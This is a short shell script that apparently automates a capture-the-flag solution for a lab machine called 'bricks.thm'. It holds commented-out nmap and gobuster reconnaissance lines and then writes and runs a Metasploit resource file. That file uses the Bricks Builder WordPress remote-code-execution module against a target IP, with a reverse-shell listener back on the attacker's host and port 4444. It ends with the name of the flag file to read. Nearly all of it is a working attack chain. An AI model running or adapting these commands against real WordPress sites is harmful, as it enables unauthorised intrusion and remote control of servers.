#/bin/sh

# Retrieve absolute path to this script
script=$(readlink -f $0)
scriptpath=`dirname $script`

# Define target IP ( the machine to attack ) and attack IP ( the machine which supports the attack )
target_ip="10.10.246.95"
attack_ip="10.9.5.12"
result_folder="/work/results/"

# Prepare environment
mkdir $result_folder 2>/dev/null

echo "1 - RECONNAISSANCE"
#nmap -p- -Pn -sC -sV -A -sS -T5 ${target_ip} > $result_folder/nmap-results.txt
#gobuster dir -u https://bricks.thm -k -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php,sh,txt,cgi,jpg,png,html,js,css,py -o $result_folder/directories.txt

echo "2 - EXPLOITATION"
echo "use multi/http/wp_bricks_builder_rce" > $result_folder/metasploit.rc
echo "set RHOSTS $target_ip" >> $result_folder/metasploit.rc
echo "set RPORT 443" >> $result_folder/metasploit.rc
echo "set SSL true" >> $result_folder/metasploit.rc
echo "set LHOST $attack_ip" >> $result_folder/metasploit.rc
echo "set LPORT 4444" >> $result_folder/metasploit.rc
echo "exploit" >> $result_folder/metasploit.rc
msfconsole -r $result_folder/metasploit.rc
# Once logged in : cat 650c844110baced87e1606453b93f22a.txt